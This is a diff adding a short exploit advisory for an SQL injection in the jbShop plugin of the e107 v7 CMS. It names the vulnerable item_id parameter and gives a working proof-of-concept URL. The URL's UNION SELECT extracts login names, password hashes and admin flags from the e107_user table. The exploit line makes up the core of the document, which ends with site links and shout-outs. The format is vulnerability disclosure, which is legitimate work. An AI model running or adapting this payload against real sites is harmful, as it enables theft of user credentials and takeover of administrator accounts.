@@ -1,0 +1,20 @@
+# Exploit Title: jbShop - e107 v7 CMS plugin - SQL Injection vulnerability
+# Author: Robert Cooper (admin[at]websiteauditing.org)
+# Software Link: http://sourceforge.net/projects/jbshop/
+# Tested on: [Linux/Windows 7]
+#Vulnerable Parameter:
+ 
+item_id=
+
+ 
+##############################################################
+PoC:
+ 
+http://www.example.com//plugins/jbshop/jbshop.php?item_details=1&item_id=-1 union all select group_concat(user_loginname,0x3a,user_password,0x3a,user_admin),2,3,4,5,6,7,8,9,10,11,12,13,14 FROM e107_user--
+
+ 
+##############################################################
+www.websiteauditing.org
+www.areyousecure.net
+ 
+# Shouts to the Belegit crew
